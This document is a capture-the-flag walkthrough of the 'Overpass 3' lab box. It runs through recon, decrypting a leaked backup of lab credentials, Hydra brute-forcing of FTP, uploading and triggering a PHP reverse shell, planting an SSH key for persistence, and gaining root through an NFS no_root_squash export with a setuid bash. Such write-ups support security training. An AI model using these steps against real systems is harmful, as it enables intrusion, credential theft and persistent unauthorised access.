# Overpass 3 - Hosting
## Difficulty: Medium

- Task 1 Overpass3 - Adventures in Hosting
    Start the engine to get the IP adrress `10.201.54.47`
    ```bash
    nmap -sC -sV 10.201.54.47 > nmap_scan 

    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
    | ssh-hostkey: 
    |   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
    |   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
    |_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
    80/tcp open  http    Apache httpd 2.4.37 ((centos))
    |_http-server-header: Apache/2.4.37 (centos)
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-title: Overpass Hosting
    Service Info: OS: Unix
    ```
    Scan port 80:
    ```bash
    gobuster dir -u http://10.201.54.47/ -w /usr/share/wordlists/dirb/common.txt

    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.201.54.47/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /.hta                 (Status: 403) [Size: 213]
    /.htaccess            (Status: 403) [Size: 218]
    /.htpasswd            (Status: 403) [Size: 218]
    /backups              (Status: 301) [Size: 236] [--> http://10.201.54.47/backups/]
    /cgi-bin/             (Status: 403) [Size: 217]
    /index.html           (Status: 200) [Size: 1770]

    ```

    Download file backup.zip and extract using gpg
    ```bash
    curl http://10.201.54.47/backups/

    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
    <html>
    <head>
    <title>Index of /backups</title>
    </head>
    <body>
    <h1>Index of /backups</h1>
    <table>
    <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
    <tr><th colspan="5"><hr></th></tr>
    <tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a>       </td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
    <tr><td valign="top"><img src="/icons/compressed.gif" alt="[   ]"></td><td><a href="backup.zip">backup.zip</a>             </td><td align="right">2020-11-08 21:24  </td><td align="right"> 13K</td><td>&nbsp;</td></tr>
    <tr><th colspan="5"><hr></th></tr>
    </table>
    </body></html>
    ```
    ```bash
    wget http://10.201.54.47/backups/backup.zip

    ls

        backup.zip  nmap_scan  README.md

    ```

    ```bash
    unzip backup.zip

        Archive:  backup.zip
    extracting: CustomerDetails.xlsx.gpg  
    inflating: priv.key  
    ```

    ```bash
    ls

    backup.zip  CustomerDetails.xlsx.gpg  nmap_scan  priv.key  README.md
    ```
    ```bash
    gpg --import priv.key

    gpg: key C9AE71AB3180BC08: "Paradox <paradox@overpass.thm>" not changed
    gpg: key C9AE71AB3180BC08: secret key imported
    gpg: Total number processed: 1
    gpg:              unchanged: 1
    gpg:       secret keys read: 1
    gpg:  secret keys unchanged: 1
    ```

    ```bash
    gpg --output CustomerDetails.xlsx --decrypt CustomerDetails.xlsx.gpg

        gpg: encrypted with rsa2048 key, ID 9E86A1C63FB96335, created 2020-11-08
        "Paradox <paradox@overpass.thm>"
    gpg: Note: secret key 9E86A1C63FB96335 expired at Wed 09 Nov 2022 04:14:31 AM WIB
    ```

    Extracting Credentials
    ```bash
    vim read_excel.py
    ```
    ```bash 
    import openpyxl

    # Load file
    wb = openpyxl.load_workbook("CustomerDetails.xlsx")

    # Pilih sheet pertama
    sheet = wb.active

    # Loop semua baris dan print
    for row in sheet.iter_rows(values_only=True):
        print(row)


    ```

    Running script
    ```bash
    python read_excel.py

    ('Customer Name', 'Username', 'Password', 'Credit card number', 'CVC')
    ('Par. A. Doxx', 'paradox', 'ShibesAreGreat123', '4111 1111 4555 1142', 432)
    ('0day Montgomery', '0day', 'OllieIsTheBestDog', '5555 3412 4444 1115', 642)
    ('Muir Land', 'muirlandoracle', 'A11D0gsAreAw3s0me', '5103 2219 1119 9245', 737)
    ```

    Create user.txt and pass.txt 
    ```bash
    vim user.txt
        paradox
        0day
        muirlandoracle

    vim pass.txt
        ShibesAreGreat123
        OllieIsTheBestDog
        A11D0gsAreAw3s0me
    ```

    Brute using Hydra SSH return nothing

    Brute using Hydra FTP
    ```bash
    hydra -L user.txt -P pass.txt ftp://10.201.54.47/

       Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-07 06:39:20
    [DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
    [DATA] attacking ftp://10.201.70.93:21/
    [21][ftp] host: 10.201.70.93   login: paradox   password: ShibesAreGreat123
    1 of 1 target successfully completed, 1 valid password found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-07 06:39:25
    ```
    Got credential `paradox:ShibesAreGreat123`
    Login to FTP `ftp paradox@10.201.54.47`

    ```bash
    ls

    drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
    -rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
    -rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
    -rw-r--r--    1 0        0             576 Nov 17  2020 main.css
    -rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg

    ```
    
    Trying to put file on FTP and check on Wb Server port 80 `put user.txt`

    ```bash
    ftp> put user.txt

    local: user.txt remote: user.txt
    229 Entering Extended Passive Mode (|||26559|)                                                                                                                                                                                              
    150 Ok to send data.                                                                                                                                                                                                                        
    100% |***********************************************************************************************************************************************************************************************|    28      202.54 KiB/s    00:00 ETA 
    226 Transfer complete.                                                                                                                                                                                                                      
    28 bytes sent in 00:00 (0.04 KiB/s)        
    ```

     In other terminal
    ```bash
    curl http://10.201.54.47/user.txt

    paradox
    0day
    muirlandoracle
    ```

    Upload Reverse Shell

    Gunakan PHP reverse shell dari PentestMonkey

        File: php-reverse-shell.php
        Edit IP & port sesuai listener:

    
    Uploud via FTP
    ```bash
    put php-reverse-shell.php

    ```
    Setup listener in other terminal
    ```bash
    nc -lvnp 1234
    ```

    Trigger shell in other terminal more
    ```bash
    curl http://10.201.54.47/php-reverse-shell.php
    ```

    Reverse Shell Success
    ```bash
    listening on [any] 1234 ...
    connect to [10.9.1.148] from (UNKNOWN) [10.201.54.47] 38472
    Linux ip-10.201.54.47 4.18.0-193.el8.x86_64 ...
    uid=48(apache) gid=48(apache) groups=48(apache)
    ```
    Enter shell as apache

    after het reverse shell stabilize our shell using python3
    ```bash
    python3 -c "import pty;pty.spawn('/bin/bash')"
    stty echo -raw;fg
    export TERM=xterm-256color
    ```
    ```bash
    cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    adm:x:3:4:adm:/var/adm:/sbin/nologin
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
    sync:x:5:0:sync:/sbin:/bin/sync
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
    halt:x:7:0:halt:/sbin:/sbin/halt
    mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
    operator:x:11:0:operator:/root:/sbin/nologin
    games:x:12:100:games:/usr/games:/sbin/nologin
    ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
    nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
    dbus:x:81:81:System message bus:/:/sbin/nologin
    systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
    systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
    tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
    polkitd:x:998:996:User for polkitd:/:/sbin/nologin
    sssd:x:997:994:User for sssd:/:/sbin/nologin
    sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
    chrony:x:996:993::/var/lib/chrony:/sbin/nologin
    rngd:x:995:992:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin
    james:x:1000:1000:James:/home/james:/bin/bash
    rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
    rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
    apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
    nginx:x:994:991:Nginx web server:/var/lib/nginx:/sbin/nologin
    paradox:x:1001:1001::/home/paradox:/bin/bash

    ```

    got user `paradox,james,root`

    ### Priviledge Escalation
    Change user to paradox using `su paradox`

    ```bash
    cd /home

    ls
        james  paradox
    cd paradox

    ls -la

        total 56
        drwx------. 4 paradox paradox   203 Nov 18  2020 .
        drwxr-xr-x. 4 root    root       34 Nov  8  2020 ..
        -rw-rw-r--. 1 paradox paradox 13353 Nov  8  2020 backup.zip
        lrwxrwxrwx. 1 paradox paradox     9 Nov  8  2020 .bash_history -> /dev/null
        -rw-r--r--. 1 paradox paradox    18 Nov  8  2019 .bash_logout
        -rw-r--r--. 1 paradox paradox   141 Nov  8  2019 .bash_profile
        -rw-r--r--. 1 paradox paradox   312 Nov  8  2019 .bashrc
        -rw-rw-r--. 1 paradox paradox 10019 Nov  8  2020 CustomerDetails.xlsx
        -rw-rw-r--. 1 paradox paradox 10366 Nov  8  2020 CustomerDetails.xlsx.gpg
        drwx------. 4 paradox paradox   132 Nov  8  2020 .gnupg
        -rw-------. 1 paradox paradox  3522 Nov  8  2020 priv.key
        drwx------  2 paradox paradox    47 Nov 18  2020 .ssh

    ```
    ```bash
    cd .ssh
    ls 
        authorized_keys  id_rsa.pub
    cat authorized_keys 
        ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLb0TvbGxoNQXBsG+4vUSvj1LPrYvFFWyoZhaABevOQtXyc/lg0fDuZf9LrjWF6maGNYi/VmlToFZf5lWTedVxvH8RTo9fgKRkjhQGZWjzJKtcaEq+uOaJyFza2NwuhrQs+fSsrcarutLIjd1jnw2W/goR7eFQfZEhKayiajU3bOo5P6HuDqG0D72H3fUf6KjL6RtfeLTA1DvCTFeAtGvMCwWKQHjbmQr7OK3pLi7LNJiuT+o9Wi4Xg2yhPfMKulHiFqmVMWPkbJW/O+pZMOeLO7fQ7yuFncVi8km3RjFAveB+jON+gtjYYg8oeaEM9kezot2AAN5mgd6Sw4+JBCt1JGG5IqdpgnYPCF54f7TwLUHf10/l+5yizf/IaVQilr8cUCmLSNlf330+I2Q4mfYThrMgbpHQTPhImGOVgLrJhppUNjlw2PlpOdV+lRSOiBGmkRbEccklqeGnK6KaORjXv0t4GGLqT6sD8jHaj9GpwaOcEorqcjwhxybHGQu8NR0= paradox@localhost.localdomain

    ```
    Create a persistent connection generate and add to authorized_keys on server
    ```bash
    ssh-keygen -f paradox          

    Generating public/private ed25519 key pair.
    Enter passphrase for "paradox" (empty for no passphrase): 
    Enter same passphrase again: 
    Your identification has been saved in paradox
    Your public key has been saved in paradox.pub
    The key fingerprint is:
    SHA256:d86oAoeYCYxeZYwl2KRnb1S60DKKUwN/TJFzIw/gHIk santstyle@kali
    The key's randomart image is:
    +--[ED25519 256]--+
    |..*=*+ .         |
    |E*o*B+=          |
    |o.**=X .         |
    |+o++* o          |
    |+o.+ =  S . .    |
    | o+ + .  . =     |
    |     o    . o    |
    |      .  .       |
    |       ..        |
    +----[SHA256]-----+

    echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDa8cd5G8l9VDYImYSbzPqO+jqYd256wtnq0CW6v5uJE santstyle@kali" >> authorized_keys

    chmod 600 paradox
    ssh -i paradox paradox@10.201.54.47
    ```

    Uploud linpeas and check

    Sudo version 1.8.29 
    Vulnerable to CVE-2021-4034

    PATH
    /home/paradox

    Trying to exploit Network File Sharing using ssh tunneling because on nmap port nfs is closed (not showing but listen on locakhost)
    ```bash
    Analyzing NFS Exports Files (limit 70)
    -rw-r--r--. 1 root root 54 Nov 18  2020 /etc/exports
    /home/james *(rw,fsid=0,sync,no_root_squash,insecure)
    ```


    ssh -N -L 2049:localhost:2049 -i paradox paradox@10.201.54.47

    mkdir James

    mount -t nfs localhost:/ ./James/

    cp /bin/bash to shared folder on home/james

    chown root:root ./bash
    
    chmod +s ./bash

    ```bash
    [james@ip-10-201-54-47 ~]$
        bash -p
    ```
    ```bash 
    bash-4.4# whoami
        root
    ```

    ```bash
    bash-4.4#
        find / -type f -name "*flag" 2>/dev/null

        /root/root.flag
        /usr/sbin/grub2-set-bootflag
        /usr/share/httpd/web.flag
        /home/james/user.flag
    ```
    - Web Flag
    `thm{*********}`

    - User Flag
    `thm{*********}`

    - Root flag
    `thm{*********}`

